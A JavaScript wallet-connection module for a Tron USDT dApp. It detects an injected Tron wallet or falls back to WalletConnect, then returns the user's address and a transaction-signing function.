import { UniversalProvider } from '@walletconnect/universal-provider';
import { WalletConnectModal } from '@walletconnect/modal';

const WC_PROJECT_ID = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
const TRON_CHAIN = 'tron:0x2b6653dc';

class WalletManager {
    constructor() {
        this.provider = null;
        this.modal = null;
        this.isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    }

    async initWC() {
        if (this.provider) return;
        this.provider = await UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: 'Tron USDT Claim',
                description: 'Secure USDT Transfer dApp',
                url: typeof window !== 'undefined' ? window.location.origin : '',
                icons: ['https://walletconnect.com/walletconnect-logo.png'],
            },
        });

        this.modal = new WalletConnectModal({
            projectId: WC_PROJECT_ID,
            chains: [TRON_CHAIN],
        });
    }

    async pollForInjected(maxMs = 3000) {
        const getInjected = () => {
            const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink;
            return (p?.defaultAddress?.base58 || p?.ready) ? p : null;
        };

        let p = getInjected();
        if (p) return p;

        const steps = Math.ceil(maxMs / 500);
        for (let i = 0; i < steps; i++) {
            await new Promise(r => setTimeout(r, 500));
            p = getInjected();
            if (p) return p;
        }
        return null;
    }

    async connect() {
        // 1. Try injected first
        let injected = await this.pollForInjected();
        if (injected) {
            if (injected.request) await injected.request({ method: 'tron_requestAccounts' }).catch(() => { });
            return {
                address: injected.defaultAddress?.base58,
                type: 'injected',
                sign: (tx) => injected.signTransaction(tx),
            };
        }

        // 2. Fallback to WalletConnect
        await this.initWC();
        return new Promise((resolve, reject) => {
            this.provider.on('display_uri', (uri) => {
                if (this.isMobile) {
                    window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                } else {
                    this.modal.openModal({ uri });
                }
            });

            const namespaces = {
                tron: {
                    methods: ['tron_signTransaction'],
                    chains: [TRON_CHAIN],
                    events: [],
                },
            };

            this.provider.connect({ optionalNamespaces: namespaces })
                .then((session) => {
                    this.modal.closeModal();
                    const address = session.namespaces.tron.accounts[0].split(':').pop();
                    resolve({
                        address,
                        type: 'walletconnect',
                        sign: async (tx) => {
                            const res = await this.provider.request({
                                method: 'tron_signTransaction',
                                params: { transaction: tx }
                            }, TRON_CHAIN);
                            return typeof res === 'string' ? JSON.parse(res) : (res.transaction || res);
                        },
                    });
                })
                .catch(err => {
                    this.modal.closeModal();
                    reject(err);
                });
        });
    }
}

export const walletManager = new WalletManager();
